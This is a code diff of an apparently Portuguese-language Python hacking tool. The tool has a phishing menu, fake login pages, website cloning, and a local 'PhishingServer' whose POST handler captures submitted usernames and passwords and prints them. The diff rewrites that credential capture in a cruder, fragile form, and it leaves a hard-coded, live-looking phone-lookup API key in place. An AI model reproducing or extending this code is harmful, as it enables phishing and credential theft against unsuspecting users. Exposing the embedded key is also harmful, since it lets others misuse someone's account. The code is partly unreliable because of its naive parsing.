@@ -7,16 +7,12 @@ import numlookupapi
 import time
 import webbrowser
 import requests
-import urllib.parse as urlparse
-from email.parser import BytesParser
-from email import policy
-import email.policy
-from io import BytesIO
 from bs4 import BeautifulSoup
 from colorama import init, Fore, Style
 
 # Função para limpar a tela do console
 def clear_console():
+    """Clears the console screen."""
     os.system('cls' if os.name == 'nt' else 'clear')
 
 # Função para exibir a mensagem de boas-vindas
@@ -235,6 +231,8 @@ def phishing_menu(language):
         else:
             handle_invalid_option(language)
 
+
+# Função para as páginas de logins falsas
 # Função para as páginas de logins falsas
 def fake_login_pages(language):
     clear_console()
@@ -288,14 +286,6 @@ def clone_website(url, server_choice, language):
     except Exception as e:
         print(f"Error cloning website: {e}")
 
-# Função para limpar os arquivos HTML e CSS
-def clean_up_files():
-    try:
-        os.remove('index.html')
-        os.remove('styles.css')
-    except Exception as e:
-        print(f"Error cleaning up files: {e}")
-
 # Função para executar o servidor local para phishing
 def run_local_server(target_url, language):
     clear_console()
@@ -304,14 +294,20 @@ def run_local_server(target_url, language):
     else:
         print("Executando site de phishing em localhost...")
 
+    # Configurar o servidor HTTP local para servir os arquivos clonados
     class PhishingServer(http.server.BaseHTTPRequestHandler):
+        def __init__(self, *args, **kwargs):
+            super().__init__(*args, **kwargs)
+
         def do_GET(self):
+            # Servir arquivos index.html e styles.css
             try:
                 if self.path == '/':
                     self.path = '/index.html'
                 elif self.path == '/styles.css':
-                    self.path = '/styles.css'
+                    pass  # Lógica para servir o arquivo CSS
 
+                # Abrir e enviar o arquivo solicitado
                 with open(os.path.join('.', self.path[1:]), 'rb') as file:
                     self.send_response(200)
                     if self.path.endswith('.html'):
@@ -325,34 +321,11 @@ def run_local_server(target_url, language):
                 self.send_error(404, 'File Not Found: %s' % self.path)
 
         def do_POST(self):
-            content_type = self.headers['Content-Type']
+            # Capturar dados do formulário POST
             content_length = int(self.headers['Content-Length'])
-            post_data = self.rfile.read(content_length)
-
-            print("Received POST data:", post_data.decode('utf-8'))  # Para depuração
-
-            username = ''
-            password = ''
-
-            if content_type.startswith('multipart/form-data'):
-                # Processar dados multipart/form-data
-                boundary = content_type.split("boundary=")[1]
-                parts = post_data.split(boundary.encode())
-
-                for part in parts:
-                    if b'Content-Disposition' in part:
-                        disposition = part.split(b'\r\n')[1].decode()
-                        if 'name="username"' in disposition:
-                            username = part.split(b'\r\n\r\n')[1].split(b'\r\n')[0].decode('utf-8')
-                        elif 'name="password"' in disposition:
-                            password = part.split(b'\r\n\r\n')[1].split(b'\r\n')[0].decode('utf-8')
-
-            else:
-                # Processar dados application/x-www-form-urlencoded
-                post_data = post_data.decode('utf-8')
-                post_params = urlparse.parse_qs(post_data)
-                username = post_params.get('login', [''])[0]
-                password = post_params.get('password', [''])[0]
+            post_data = self.rfile.read(content_length).decode('utf-8')
+            username = post_data.split('&')[0].split('=')[1]
+            password = post_data.split('&')[1].split('=')[1]
 
             # Exibir credenciais no console
             if language == '1':
@@ -393,8 +366,13 @@ def run_local_server(target_url, language):
     except Exception as e:
         print(f"Error running local server: {e}")
 
-# Exemplo de uso da função run_local_server
-run_local_server("http://www.example.com", '2')
+# Função para limpar os arquivos HTML e CSS
+def clean_up_files():
+    try:
+        os.remove('index.html')
+        os.remove('styles.css')
+    except Exception as e:
+        print(f"Error cleaning up files: {e}")
 
 # Função para informações de número de telefone
 def phone_number_info(language):
@@ -410,7 +388,7 @@ def phone_number_info(language):
 
     # Consulta à API numlookupapi para obter informações detalhadas
     try:
-        client = numlookupapi.Client('num_live_nPxUn5CQCi43HYw85qiaohr9FvykkoqCa1x8QkEy')
+        client = numlookupapi.Client('num_live_nPxUn5CQCi43HYw85qiaohr9FvykkoqCa1x8QkEy')  # Substitua 'YOUR-API-KEY' pelo seu API key
         result = client.validate(phone_number)
         
         # Formatando a resposta no estilo desejado
